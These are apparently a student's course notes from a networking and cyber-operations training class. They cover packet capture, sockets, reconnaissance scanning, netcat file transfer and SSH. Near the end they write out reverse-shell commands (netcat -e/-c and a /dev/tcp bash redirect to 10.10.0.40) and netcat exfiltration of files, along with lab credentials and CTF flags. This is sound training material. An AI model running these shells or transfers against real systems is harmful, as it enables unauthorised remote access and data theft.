# Day 1 FUNDAMENTALS #

Binary to hex conversion - https://www.rapidtables.com/convert/number/binary-to-decimal.html

convert encoded message ->  https://gchq.github.io/CyberChef/

Evernote -> https://evernote.com/legal/open-source

Alt F4 -> gets rid of unclass banner. 

BBB Link
We will use this link to share our screen: https://bbb.cybbh.space/b/net-nfp-jln-zok

2023-11-20T17:46:20ZClass Notification
INTERNET HOST Login Info
Hostname: BLUE-INTERNET_HOST-student_11 IP: 10.50.39.135 Username: student Password: password

2023-11-20T11:51:01Z

YOUR MACHINE KIRWA -> ssh -X student@10.50.39.135

Hostname: BLUE-INTERNET_HOST-student_11 IP: 10.50.39.135 Username: student Password: password

Convert ip address to hex -> https://www.browserling.com/tools/ip-to-hex

-X enables use of graphics can open things like wireshack. 

Advantages of Assymetric 

http://networking-ctfd-2.server.vta:8000/challenges

https://net.cybbh.io/public/networking/latest/index.html -> Notes and all 

https://miro.com/app/board/o9J_klSqCSY=/ -> diagram

ssh keys are located in .ssh server... the (.) means it's a hidden folder 
netstat is being deprecated and being replaced by ss. ifconfig is also being depracated and being replaced by ip. 
ifconfig might require root access. 

ss -antl -> list all ip addresses, n means number t means tcp and l means listening.... 
terminator helps with splitting screens... 

Hostname: BLUE-INTERNET_HOST-student_11 IP: 10.50.39.135 Username: student Password: password

how to open terminator -> terminator & (the & makes sure that it runs in the background)

eom bl

eom blue_range_complete.png -> opens png 

ip a 

eog blue_range_complete.png -> opens a png

cat README -> has instructions for a lit of some useful commands on
pcmanf -> opens a file manager... 

ssh, telnet, http ! colon and then a port if you're using http. 

## SLIDE 1 -> OUTCOMES ##

Layer 1 - understand bits and bytes
Layer 2 - Layer 2 equipment, vlan, ARP -> Address Resolution Protocol 

Understand what Address Resolution Protocol means... Address Resolution Protocol (ARP) is a procedure that connects a dynamic IP address to a fixed physical machine address in a local area network (LAN). The physical machine address is also known as a media access control (MAC) address.

TCP -> at the transport layer they're called segments and at the UDP, they're called Datagrams. 
You can view layer 5 (sessions) using netstat  or ss -> shows open connections! 

### Layer 1 ###

Binary 
Base2 -> Two symbols (0 and 1)
128(2^7)..................1(2^0)

1 byte = byte 
2 bytes = halfword 
4 bytes = word 

A nibble is half a byte = 4 bits 

0-16 = hexadecimal value. 
base 10 - ten symbols (0 to 9, A - F)
Look at the diagram hex 0*94 = 148 as a decimal. 

Base64 - 64 (A-Z,a-z, 0-9, +,/)
place values - 2^0.................2^5
Base 64 has to be a minimum grouping of 4

#### Topologies ####

BUS - > 
STAR -> 
Ring -> like bus but loops back
Mesh -> 
Wireless -> 
Hierarchial -> Core, Distribution, Access

Ethernet timing see slides. 

#### Data link sub-layers ####
MAC -> Medium Access Control 
LLC -> Logical Link Control 

Has to bridge between physical and logical MAC deals with physical and LLC deals with logical. 
MTU -> maximum transmission unit. How much data you can send inside the layer 2 frame. Default limit for mtu is 1500 bytes. 

whta is FCS/CRC. 

Ethernet header -> destination mac and source mac 

Switch attacks
CAM Table Overflow attack 
MAC addresses are 48-bit | 6 bytes | 12 hex 

Look at he slides for the format. 

Look at the 8 bit to identify if a MAC address is a unicast or a multi-cast. 
It's easy nowadays to spoof a mac address because they're no longer burned in and can be changed by coding it with software. 

VLAN TYPES 
- default vlan 
- data vlan 
- voice - VOIP 
- Management - Switch and router management
- Native - Untagged traffic

What addresses change during data transfer? Is it source addresses or destination addresses... 

VLAN hopping -> What is this? 

RARP request and wait for an RARP reply? 
GRATUITOUS ARP ????

BPDUs and STP 

### Layer 2 ###
Practice of "borrowing" host bits and used them as subnet bits. 
How fragmentations can be used to perform attacks!!!
IPV4 Auto configuration vulnerability 
- Rogue DHCP 
- Evil Twin
- DHCP Starvation 

Traceroute port using udp is port 53 and using tcp is 80?

sudo tcpdump host 8.8.8.8 -n
sudo traceroute 8.8.8.8 -T 

ICMPV4 Attacks
ICMP
SMURF attack
ICMP Covert Channels
Oversized ICMP messages
Firewalking (traceroute)

IPV6 packets will always be 40 bytes long. 

Summary addresses... the addresses that are advertised. 

P@cket_C@rv1ng

N3tw0rkFund3m3nt@ls


Task 1: Frame and Packet H0eaders
START FLAG: P@cket_C@rv1ng


Utilize the /home/activity_resources/pcaps/packet-headers.pcapng for this activity.

CISCO switches - CDP 
Router Information - RIP

### Application Layer ###

ICMP port unreachable if there's no firewall and the connection is lost. 

sshd - refers to ssh daemon. Your processes.... like what port you're listening to? 
x11forwarding -> don't have to allow it... turn it off if you don't want people to export graphics...allows graphics to come back. 

Where is DNS located... understand this... review TCP handshake and understand the fundamentals.... 
ACK number, SYNC number, MSS, packet size and MTU (maximum transmission unit)



Task 2: Packet Payloads
START FLAG: Wh@t_P@load?

# TRAFFIC CAPTURE #

Libpcap - library pcap -> tcpdump.org
WinPcap - windows pcap -> winpcap.org
NPcap - nmap pcap -> nmap.org/npcap.

This flag will be released by Mission Command.

Flag Formats for all Basic Analysis Challenges

tcpdump flags:

COMMAND: tcpdump filter syntax
FLAG: filter syntax

BPFCheck.pcap can be found on your INTERNET_HOST in /home/activity_resources/pcaps

To find the packet count, you can append | wc -l after your command. For example tcpdump -n "yourfilter" -r BPFCheck.pcap | wc -l


BPFCheck.pcap Download Link

### TCP Dump primitivies ###

- user friendly expressions
    - src or dst 
    - host or net -> Host cares about that device and net any othe device. 
    - tcp or udp -> Looking for internet traffic.

sudo tcpdump -i eth0 -> Captures everything... Capture packets network packts on the eth0 neteork interface. -i specifies the network interface in this case eth0 and not eth1 or wlan0 or wlan1. 

type -> host, net, port or port-range
dir -> src or dest
proto -> particular protocols either ether, arp, ip, ip6, icmp, tcp or udp

-A -> print payload and ASCI -> sudo tcpdump -i eth0 -A
-D -> list interfaces -> sudo tcpdump -D
-i -> specifiy capture interface -> sudo tcpdump -i eth0
-e -> print data-link  headers -> sudo tcpdump -i eth0 -e
sudo tcpdump -i eth0 -n -> list ip and port 
-X or XX -> print payload in HEX and ASCII -> sudo tcpdump -i eth0 
-w -> write to pcap 
-r -> read from pcap
-v, vv, or vvv -> verbosity -> sudo tcpdump -i eth0 -v -> Determines how much detail should be output in the view below.
-n -> no inverse lookups 

### Logical Operators ###
- Primitives may be combined using:
    - Concatenation: 'and' (&&) ->  sudo tcpdump -i eth0 -e tcp port
    - Alteration: 'or' (||)
    - Negation: 'not' (!) -> sudo tcpdump -i eth0 -e tcp port not 22 ->  sudo tcpdump -i eth0 -e tcp port ! 22
    -  sudo tcpdump -i eth0 -e host not 192.168.242.193

- < or <= 
- > or >=
- = or != 

Hostname: BLUE-INTERNET_HOST-student_11 IP: 10.50.39.135 Username: student Password: password

sudo tcpdump -i eth0 port ! 22 -d -> -d lists the steps....

TODO??? Revisit packet content and see how they're structured!!! 


sudo tcpdump -i eth0 'tcp[0:2]=22 || tcp[2:2]=22' -> Capture ssh traffic coming from the source -

### BITWISE MASKING ###

ALOT TO BE STUDIED?????TODO---REVIEW CLASS NOTES AND UNDERSTAND THAT VERY WELL


### BITWISE MASKING ###

Menu -> Statistics -> protocol hierachy # shows what how many ipv4 or ipv6 you have 

Analyze -> Expert information # general information on packets, what got dropped, what needs to be retransmitted e.t.c. 

Menu -> Tools -> Firewall ACL Rules 

Menu -> Edit -> Preference -> Protocols -> SSL # decrypts traffic

Menu -> Statistics -> Conversations # shows the devices communicating

p0f -i eth0 # running pof on the interface 

### SOCKET CREATION  ###
setting up a listener 

Ask Brett about ranking up... 

IPPROTO -> Proto stands for protocol 
Datagrams = UDP 
Family -> AF_INET, AF_INET6, AF_UNIX
Type -> SOCK_STREAM (default - tcp), SOCK_DGRAM (UDP), SOCK_RAW (What does raw do)
Protocol -> should be 0, default, IPPROTO_RAW


data, conn = snrecvfrom(1024) -> conn prints to the console, data stores whatever is received as data

control shift c and control shift v -> copy and paste.....

setup a listening port --- nc nlvp 

The command nc -knlvp is a combination of options used with the nc (netcat) command in Unix-like systems. Let's break down what each option signifies:

nc: This is the netcat command, a versatile networking tool used for reading from and writing to network connections using TCP or UDP protocols.

-k: This option tells netcat to keep listening for another connection after its current connection is completed. It's often used in server mode to allow multiple sequential connections to the server.

-n: This option instructs netcat not to resolve hostnames (i.e., not to use DNS for names of hosts in addresses).

-l: This is used to specify that netcat should listen for an incoming connection rather than initiate a connection to a remote host.

-v: This enables verbose mode, which provides additional details about the connection and data transfer.

-p: This is followed by a specific port number. It specifies the source port netcat should use, which is relevant when netcat functions in client mode. However, in listening mode (-l), this option specifies the port on which to listen.

So, when you run nc -knlvp [port], you are starting netcat in a mode where it listens on a specified port ([port]), does not resolve hostnames, stays open for multiple connections (one after the other), and provides verbose output about its operations. This is typically used to create a simple server that can accept connections on the specified port.

### UDP SOCKET CREATION  ###

STREAM SOCKET SENDER DEMO
#!/usr/bin/python3
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
ip_addr = '127.0.0.1'
port = 1111
s.connect((ip_addr, port))
message = b"Message"
s.send(message)
data, conn = s.recvfrom(1024)
print(data.decode('utf-8'))
s.close()

STREAM SOCKET RECEIVER DEMO
#!/usr/bin/python3
import socket
import os
port = 1111
message = b"Connected to TCP Server on port %i\n" % port
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('', port))
s.listen(1)
os.system("clear")
print ("Waiting for TCP connections\n")
while 1:
    conn, addr = s.accept()
    connect = conn.recv(1024)
    address, port = addr
    print ("Message Received - '%s'" % connect.decode())
    print ("Sent by -", address, "port -", port, "\n")
    conn.sendall(message)
    conn.close()

DATAGRAM SOCKET SENDER DEMO
#!/usr/bin/python3
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
ip_addr = '127.0.0.1'
port = 2222
message = b"Message"
s.sendto(message, (ip_addr, port))
data, addr = s.recvfrom(1024)
print(data.decode())
RAW IPV4 SOCKETS
Raw Socket scripts must include the IP header and the next headers.
Requires guidance from the "Request for Comments" (RFC) to follow header structure properly.
RFCs contain technical and organizational documents about the Internet, including specifications and policy documents.
See RFC 791, Section 3 - Specification for details on how to construct an IPv4 header.
RAW SOCKET USE CASE
Testing specific defense mechanisms - such as triggering and IDS for an effect, or filtering
Avoiding defense mechanisms
Obfuscating data during transfer
Manually crafting a packet with the chosen data in header fields

PYTHON BASE64 ENCODING
import base64
message = b'Message'
hidden_msg = base64.b64encode(message)


this is connectiononelss 
To listen -> nc -nlvup 2222 # listening on port 2222
Run the python script to establish the connection

To check active posts listening->  ss -nltup 


echo "message" | xxd -> Encoding a text 
xxd file.txt file-encoded.txt -> Encode file to hex
xxd -r file-encoded.txt file-decoded.txt -> decode file from hex

PYTHON BASE64 ENCODING
import base64
message = b'Message'
hidden_msg = base64.b64encode(message)

##################
##Build Packet Header##
##################
# Lets add the IPv4 header information
# This is normally 0x45 or 69 for Version and Internet Header Length
ip_ver_ihl = 0x45
# This combines the DSCP and ECN feilds.  Type of service/QoS
ip_tos = 96 # What is the tos, this is the quality of service work.. DSCP, for 97 it would be
# The kernel will fill in the actually length of the packet
ip_len = 0 # given
# This sets the IP Identification for the packet. 1-65535
ip_id = 3465
# This sets the RES/DF/MF flags and fragmentation offset
ip_frag = 0x8000
# This determines the TTL of the packet when leaving the machine. 1-255
ip_ttl = 255
# This sets the IP protocol to 16 (CHAOS) (reference IANA) Any other protocol it will expect additional headers to be created.
ip_proto = 16 # putting an ip packet and a payload with known hex header. ip is a carrier for a protocol. Always carries something. 16 we are not carrying other protocol? What value would be if we were carrying protocol? If we are carrying chaos we put the value 6. What else can we carry other than chaos? 
# The kernel will fill in the checksum for the packet
ip_check = 0
# inet_aton(string) will convert an IP address to a 32 bit binary number
ip_srcadd = socket.inet_aton(src_ip)
ip_dstadd = socket.inet_aton(dst_ip)


##########
##Message##
##########
# Your custom protocol fields or data. We are going to just insert data here. Add your message where the "?" is. Ensure you obfuscate it though...don't want any clear text messages being spotted! You can encode with various data encodings. Base64, binascii
message = b'last_name'                  #This should be the student's last name per the prompt.. will be encoded as a hex. Why are we encoding it? Encoding is done ot obfuscate the payload...
hidden_msg = binascii.hexlify(message)  #Students can choose which encodeing they want to use.
# final packet creation
packet = ip_header + hidden_msg
# Send the packet. Sendto is used when we do not already have a socket connection. Sendall or send if we do.
s.sendto(packet, (dst_ip, 0))
# socket.send is a low-level method and basically just the C/syscall method send(3) / send(2). It can send less bytes than you requested, but returns the number of bytes sent.
# socket.sendall is a high-level Python-only method that sends the entire buffer you pass or throws an exception. It does that by calling socket.send until everything has been sent or an error occurs.


# Networking - 3 - Network Reconnaissance #


Dig -> (Domain Information Groper) -> Queries the Domain Name System servers. Provides detailed information about various DNS records like A, MX, NS e.t.c Troubleshoots DNS problems and obtains specific DNS information 
    Dig - queries DNS server over UDP port 53
        Name to IP records
    
    dig zonetransfer.me A
    dig zonetransfer.me AAAA
    dig zonetransfer.me MX
    dig zonetransfer.me TXT
    dig zonetransfer.me NS
    dig zonetransfer.me SOA

Whois -> used to query databases that store the registered users or assignees of internet resources, such as domain name, an ip address block or an autonomous system 
    Whois can provide information such as 
        - Domain registrant 
        - Registeration dates
        - Expiration dates
        - Hosting company 
    Whois - queries DNS registrar over TCP port 43
    Information about the owner who registered the domain

    whois zonetransfer.me

Netcraft -> Used for antiphishing services, cybercrime disruption and web application security testing. Analyzes the security and reliability of websites and hosting providers as well as gathering data on internet infrastructure adn web technologies

Shodan -> Search engine designed to find devices connected to the internet. Scans devices like webcams, routers, servers IoT devices and collects information on them such as banners, open ports, and types of services running. 

Passive OS Fingerprinting (pOf) -> Used to determine the operating system of a remote host (computer or device) without actively interacting with the host. Accesses traffic passively observed. 
    Include details such as packet headers, TCP/IP stack behavior, specific network protocols used
    Less likely to be detected. Doesn't generate additional network traffic. 
    Used in network monotoring, security analysis and IDS 

Banner Grabbing -> Used to gather information about a computer system and services running on its open ports. Captures banner or header information that services ssend when establishing connection. Banners contains details like the type and version of software running e.g. web server, FTP server. 

Ping: A basic network tool used to test the reachability of a host on an IP network. It measures the round-trip time for messages sent from the originating host to a destination computer.

Nmap: A network scanning tool used to discover hosts and services on a computer network, thus creating a "map" of the network. Nmap can be used to discover devices running on a network and identify open ports and services.

Netcat (nc): A versatile networking utility for reading from and writing to network connections using TCP or UDP. It's often dubbed the Swiss army knife of networking and can be used for a variety of tasks like port scanning, transferring files, and port listening.

Curl: A tool to transfer data from or to a server using various protocols, including HTTP, HTTPS, FTP, and more. It's commonly used for downloading files or web pages from the command line.

Wget: A command-line utility for downloading files from the web. It supports HTTP, HTTPS, and FTP protocols, and can recursively download files from websites.

/dev/tcp: A pseudo-device file on Unix-like systems used to interface with TCP sockets in shell scripts. It allows for simple TCP operations from the command line or in a script.

## RECONNAISSANCE STEPS ##

Network Footprinting: This is the initial phase in information gathering, where an attacker or security professional gathers as much information as possible about a target network. It involves identifying the domain names, network blocks, IP addresses of systems, and accessible networks. Footprinting can be passive (gathering information without directly interacting with the target) or active (directly engaging with the target system).

Scanning: This step involves using technical tools to identify open ports, live systems, and various services running on the network. Scanning helps to map out the network structure and understand the services and systems available.

Enumeration: This is a more in-depth collection of data about a target network. It involves extracting user names, machine names, network resources, and other services from a system. Enumeration can reveal significant details about the inner workings of the network and its hosts. Simple Network Management Protocol (SNMP), an internet standard protocol for collecting and organizing information about managed devices on ip networks and for modifying that information and Domain Name System details 

Vulnerability Assessment: In this phase, the information gathered from the above steps is used to identify vulnerabilities or weaknesses in the network. Vulnerability assessments often involve automated scanning tools to detect known vulnerabilities, such as outdated software versions, misconfigurations, and security flaws that could be exploited

## IDENTIFYING AREAS OF INTERESTS ##

/etc/passwd: This file in Unix-like operating systems contains user account information. It traditionally includes fields like the username, password (often represented as an 'x' indicating the password is stored in /etc/shadow), user ID (UID), group ID (GID), user's full name or description (GECOS field), home directory, and shell.

/etc/shadow: This file stores secure user account information including encrypted passwords and related data, such as password expiration details. It is accessible only to privileged users.

SAM Database: In Windows systems, the Security Accounts Manager (SAM) database stores user credentials, typically in an encrypted format. The SAM is part of the Windows registry and contains user names and password hashes, playing a crucial role in Windows authentication mechanisms.

## ZONE TRANSFERS ##

A zone transfer in the context of DNS (Domain Name System) is a process where the complete copy of all the DNS records for a domain (zone) is transferred from a primary DNS server (master) to a secondary DNS server (slave). This is used to synchronize data between DNS servers and ensure consistency in resolving domain names across different locations. Zone transfers occur over TCP port 53 and should be restricted and securely configured to prevent unauthorized access, as they can expose detailed information about the network structure and internal naming conventions of the domain.

dir axfr {@soa.server} {target-site} # server of authority 
dig axfr @nsztm1.digi.ninja zonetransfer.me

The command dig axfr @nsztm1.digi.ninja zonetransfer.me is used to perform a DNS zone transfer. Here's what it does:

dig: A command-line tool for querying DNS name servers.
axfr: Stands for "Asynchronous Transfer Full Range." This option is used to request a full zone transfer.
@nsztm1.digi.ninja: Specifies the name server to query, in this case, nsztm1.digi.ninja.
zonetransfer.me: This is the target domain for which the zone transfer is being requested.

This command attempts to get all the DNS records for the domain zonetransfer.me

## PASSIVE OF FINGERPRINTER (POF) ##

p0f: Passive scanning of network traffic and packet captures.

more /etc/p0f/p0f.fp
sudo p0f -i eth0            # Using sudo as we are accessing the operating system. 
sudo p0f -r test.pcap

Examine packets sent to/from target
Can guess Operating Systems and version
Can guess client/server application and version

## NETWORK SERVICE DISCOVERY ##

NMAP options. 

1. Broadcast Ping/Ping sweep (-sP, -PE)      # Ping everything user nmap options.. # Tells us what some of the replies are
2. SYN scan (-sS)                            # SyN packet. Once it receives a syn ack from the server it shuts down. Less likely to log, dosn't establish a full scan 
3. Full connect scan (-sT)                   # SYN, Receives packet and shuts down..
4. Null scan (-sN)                           # No flags. Send no flags are sent at all, see what the responses are.
5. FIN scan (-sF)                            # Sends the FIN flag
6. XMAS tree scan (-sX)                      # FIN, PSH, and URG flags
7. UDP scan (-sU)                            # checks for UDP ports on a target system... sends udp 
8. Idle scan (-sI)                           # TCP port scan method for determining what services are open on a target computer without leaving traces pointing back at oneself.
9. ACK/Window scan (-sA)                     # Send a scan to try and create a specific window size
10. RPC scan (-sR)                           # Allows diff services to talk to each other
11. FTP scan (-b)                            # FTP server
12. Decoy scan (-D)                         
13. OS fingerprinting scan (-O)              # 
14. Version scan (-sV)                       # Determine what service...
15. Protocol ping (-PO)                      # Goes through a series of protocols to discover an active host. Cirlces through various ones to find one that is active
16. Discovery probes (-PE, -PP, -PM)         # -PP -> Ping echo request.

### NMAP - OTHER OPTIONS ###

-PE - ICMP Ping
-Pn - No Ping                                # boost discovery, send a ping to every device out there and some pings are dropped die to firewall..Important when you get to tunneling for those that want to use NMAP 

### NMAP - TIME-OUT ###

-T0 - Paranoid - 300 Sec
-T1 - Sneaky - 15 Sec
-T2 - Polite - 1 Sec
-T3 - Normal - 1 Sec
-T4 - Aggresive - 500 ms
-T5 - Insane - 250 ms


### TRACEROUTE - FIREWALKING ###


Traceroute firewalking is a network reconnaissance technique that combines traceroute and firewall rule mapping to discover the network topology and firewall rule sets. In this technique, specially crafted packets with varying TTL (Time To Live) values are sent to pass through a network until they are stopped by a firewall. By observing where packets are dropped and analyzing the responses from intermediate routers, it's possible to infer the presence and configuration of firewalls. This method can be used to map out networks and identify rules in firewall configurations without directly probing the firewall itself.

traceroute 172.16.82.106                    # This standard traceroute command traces the route packets take to the specified IP address using UDP packets.
traceroute 172.16.82.106 -p 123             # Traces the route using UDP packets targeted at port 123.
sudo traceroute 172.16.82.106 -I            # Uses ICMP Echo Request packets instead of UDP. This requires superuser privileges (hence sudo).
sudo traceroute 172.16.82.106 -T            # Uses TCP SYN packets for tracing. This is useful for tracing through networks that block ICMP and UDP.
sudo traceroute 172.16.82.106 -T -p 443     # Similar to the previous, but specifically targets port 443 (commonly used for HTTPS) with TCP SYN packets. This can be useful for testing paths on networks where port 443 is likely to be open.

### NETCAT - SCANNING ###

nc [Options] [Target IP] [Target Port(s)]
-z : Port scanning mode i.e. zero I/O mode
-v : Be verbose [use twice -vv to be more verbose]
-n : do not resolve ip addresses
-w1 : Set time out value to 1
-u : To switch to UDP


### NETCAT - HORIZONTAL SCANNING ###

1 hosts but specific ports

Range of IPs for specific ports

TCP
for i in {1..254}; do nc -nvzw1 172.16.82.$i 20-23 80 2>&1 & done | grep -E 'succ|open'

This script loops through IP addresses from 172.16.82.1 to 172.16.82.254.
It uses nc (Netcat) with -nvzw1 flags to attempt TCP connections to ports 20, 21, 22, 23, and 80 on each IP.
The command checks for successful connections or open ports and outputs those results.
2>&1 & redirects stderr to stdout and runs the scan in the background for each IP.

succ -> succeed. Certain version responds with succeeded or open when they're open. 

UDP
for i in {1..254}; do nc -nuvzw1 172.16.82.$i 1000-2000 2>&1 & done | grep -E 'succ|open'

This script loops through IP addresses from 172.16.82.1 to 172.16.82.254.
It uses nc (Netcat) with -nvzw1 flags to attempt TCP connections to ports 20, 21, 22, 23, and 80 on each IP.
The command checks for successful connections or open ports and outputs those results.
2>&1 & redirects stderr to stdout and runs the scan in the background for each IP.

### NETCAT - VERTICAL SCANNING ###

multiple ports but specific ips. 

Range of ports on specific IP

TCP
nc -nzvw1 172.16.82.106 21-23 80 2>&1 | grep -E 'succ|open'

UDP
nc -nuzvw1 172.16.82.106 1000-2000 2>&1 | grep -E 'succ|open'

### NETCAT - TCP SCAN SCRIPT ###

#!/bin/bash
echo "Enter network address (e.g. 192.168.0): "
read net
echo "Enter starting host range (e.g. 1): "
read start
echo "Enter ending host range (e.g. 254): "
read end
echo "Enter ports space-delimited (e.g. 21-23 80): "
read ports
for ((i=$start; $i<=$end; i++))
do
    nc -nvzw1 $net.$i $ports 2>&1 | grep -E 'succ|open'
done

### NETCAT - UDP SCAN SCRIPT ###

#!/bin/bash
echo "Enter network address (e.g. 192.168.0): "
read net
echo "Enter starting host range (e.g. 1): "
read start
echo "Enter ending host range (e.g. 254): "
read end
echo "Enter ports space-delimited (e.g. 21-23 80): "
read ports
for ((i=$start; $i<=$end; i++))
do
    nc -nuvzw1 $net.$i $ports 2>&1 | grep -E 'succ|open'
done

### NETCAT - BANNER GRABBING ###
Find what is running on a particular port

nc [Target IP] [Target Port]
nc 172.16.82.106 22
nc -u 172.16.82.106 53
-u : To switch to UDP

### CURL AND WGET ###

Both can be used to interact with the HTTP, HTTPS and FTP protocols.
Curl - Displays ASCII
curl http://172.16.82.106
curl ftp://172.16.82.106

Wget - Downloads (-r recursive)
wget -r http://172.16.82.106
wget -r ftp://172.16.82.106

## DESCRIBE METHODS USED FOR PASSIVE INTERNAL NETWORK RECONNAISSANCE ##

## PACKET SNIFFERS ##
Wireshark
Tcpdump
p0f

Limited to traffic in same local area of the network

## NATIVE HOST TOOLS ## 
### Show TCP/IP network configuration ###
Windows: ipconfig /all
Linux: ip address (ifconfig depreciated)
VyOS: show interface

### Show DNS configuration ####
Windows: ipconfig /displaydns
Linux: cat /etc/resolv.conf # Shows the name server specification 

What do you care about DNS server, gives possible sub-domains. 

### Show ARP Cache -> ARP cache poisoning. ###
Windows: arp -a
Linux: ip neighbor (arp -a depreciated)

### Show network connections ###
Windows: netstat # you need to sudo 
Linux: ss (netstat depreciated) # you need to sudo

Example options useful for both netstat and ss: -antp
a = Displays all active connections and ports.
n = No determination of protocol names. Shows 22 not SSH.
t = Display only TCP connections.
u = Display only UDP connections.
p = Shows which processes are using which sockets.

### OS Location ###
Windows: %SystemRoot%\system32\drivers\etc\services
Linux: /etc/services -> cat /etc/services

### Show Running Processes ###
Windows: tasklist
Linux: ps or top

Example options useful for ps: -elf
e = Show all running processes
l = Show long format view
f = Show full format listing

### Command path ###
which
whereis

### Routing Table ###
Windows: route print
Linux: ip route (netstat -r deprecated)
VyOS: show ip route

uname # gives the name of the os 

uname -a # gives all the information 

cat /etc/*rel* -> gives os name and version 

### File search ###
find / -name hint* 2> /dev/null # name being the name of the file 
find / -iname flag* 2> /dev/null # 


## DESCRIBE METHODS USED FOR ACTIVE INTERNAL NETWORK RECONNAISSANCE ##

### ARP SCANNING ###
arp-scan --interface=eth0 --localnet
nmap -sP -PR 172.16.82.96/27

### PING SCANNING ###
ping -c 1 172.16.82.106
for i in {1..254}; do (ping -c 1 172.16.82.$i | grep "bytes from" &) ; done
sudo nmap -sP 172.16.82.96/27

### DEV TCP SCANNING ###
for p in {1..1023}; do(echo >/dev/tcp/172.16.82.106/$p) >/dev/null 2>&1 && echo "$p open"; done

for p in {1..1023}; do: This line starts a loop that iterates over the numbers from 1 to 1023, one at a time. The variable p is used to represent the current port number being tested.
(echo >/dev/tcp/172.16.82.106/$p) >/dev/null 2>&1: This is the core of the code, and it's used to check if a TCP connection can be established to the remote host on a specific port. Here's how it works:

echo >/dev/tcp/172.16.82.106/$p: This part of the code creates a special file descriptor that allows you to write to a TCP connection. It effectively tries to establish a TCP connection to the IP address 172.16.82.106 on the port specified by the variable p.

>/dev/null: This part redirects the standard output (stdout) of the echo command to /dev/null, which essentially discards any output.

2>&1: This part redirects the standard error (stderr) of the echo command to the same location as stdout. In this case, it's also redirected to /dev/null.

So, if a connection can be established successfully, nothing is printed to the console (stdout and stderr are redirected to /dev/null), but if the connection fails, any error messages are also suppressed.

&& echo "$p open": This part of the code is executed if the previous command ((echo >/dev/tcp/172.16.82.106/$p)) is successful, which means a connection was established. It then prints the port number followed by "open" to the console.

The result of running this script is that it iterates through ports 1 to 1023, attempts to establish a TCP connection to the remote host (172.16.82.106) on each port, and if successful, it prints the port number followed by "open" to the console. This way, you can determine which ports are open and accepting connections on the remote host.



### CLASS EXERCISES ###
ssh student@10.50.47.43 ls -l /home/student/joke
ssh student@10.50.47.43 cat /home/student/joke
touch kirwa.txt
scp kirwa.txt student@10.50.47.43:/home/student/joke


We can use cat and netcat to send files back and fort. 
scp student@172.

nc 19.168.241.213 33502 < wilkinson.txt # 

nc -nlvp 2211 > stolen_bin # This is on the other side... output your list into a new file 



## FILE TRANSFER AND REDIRECTION ##

### NETCAT: CLIENT TO LISTENER FILE TRANSFER ###
Listener (receive file):

nc -lvp 9001 > newfile.txt
Client (sends file):

nc 172.16.82.106 9001 < file.txt

### NETCAT: LISTENER TO CLIENT FILE TRANSFER ###
Listener (sends file):

nc -lvp 9001 < file.txt
Client (receive file):

nc 172.16.82.106 9001 > newfile.txt

### NETCAT RELAY DEMOS ###
Listener - Listener

On Blue_Host-1 Relay:

$ mknod mypipe p
$ nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
On Internet_Host (send):

$ nc 172.16.82.106 1111 < secret.txt
On Blue_Priv_Host-1 (receive):

$ nc 192.168.1.1 3333 > newsecret.txt

Client - Listener

On Internet_Host (send):
$ nc -lvp 1111 < secret.txt

On Blue_Priv_Host-1 (receive):
$ nc 192.168.1.1 3333 > newsecret.txt

On Blue_Host-1 Relay:
$ mknod mypipe p
$ nc 10.10.0.40 1111 < mypipe | nc -lvp 3333 > mypipe

Listener - Client

On Internet_Host (send):

$ nc -172.16.82.106 1111 < secret.txt
On Blue_Priv_Host-1 (receive):

$ nc -lvp 3333 > newsecret.txt
On Blue_Host-1 Relay:

$ mknod mypipe p
$ nc -lvp 1111 < mypipe | nc 192.168.1.10 3333 > mypipe

### FILE TRANSFER WITH /DEV/TCP ###
On the receiving box:

$ nc -lvp 1111 > devtcpfile.txt
On the sending box:

$ cat secret.txt > /dev/tcp/10.10.0.40/1111
This method is useful for host that does not have NETCAT available.

### REVERSE SHELL USING NETCAT ###

First listen for the shell on your device.

$ nc -lvp 9999
On Victim using -c :

$ nc -c /bin/bash 10.10.0.40 9999
On Victim using -e :

$ nc -e /bin/bash 10.10.0.40 9999

### REVERSE SHELL USING /DEV/TCP ###
First listen for the shell on your device.

$ nc -lvp 9999
On Victim:

024a1256e6f2ac6f08d2ccca2c3ba2a1

#### $ /bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1 #### 

## SSH TUNNELING AND COVERT CHANNELS ##

### SECURE SHELL (SSH) ###

Built on Client vs Server vs Session

### SSH FIRST CONNECT ###

student@internet-host:~$ ssh student@172.16.82.106
The authenticity of host '172.16.82.106 (172.16.82.106)' can't be established.
ECDSA key fingerprint is SHA256:749QJCG1sf9zJWUm1LWdMWO8UACUU7UVgGJIoTT8ig0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.16.82.106' (ECDSA) to the list of known hosts.
student@172.16.82.106's password:
student@blue-host-1:~$
You will need to approve the Server Host (Public) Key

Key is saved to /home/student/.ssh/known_hosts

### SSH RE-CONNECT ###
ssh student@172.16.82.106
student@172.16.82.106's password:
student@blue-host-1:~$
Further SSH connections to server will not prompt to save key as long as key does not change

### SSH HOST KEY CHANGED ### 
ssh student@172.16.82.106
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the ECDSA key sent by the remote host is
SHA256:RO05vd7h1qmMmBum2IPgR8laxrkKmgPxuXPzMpfviNQ.
Please contact your system administrator.
Add correct host key in /home/student/.ssh/known_hosts to get rid of this message.
Offending ECDSA key in /home/student/.ssh/known_hosts:1
remove with:
ssh-keygen -f "/home/student/.ssh/known_hosts" -R "172.16.82.106"
ECDSA host key for 172.16.82.106 has changed and you have requested strict checking.
Host key verification failed.

### SSH KEY CHANGE FIX ###
ssh-keygen -f "/home/student/.ssh/known_hosts" -R "172.16.82.106"
Copy/Paste the ssh-geygen message to remove the Host key from the known_hosts file

### SSH LOCAL PORT FORWARDING ###

Syntax
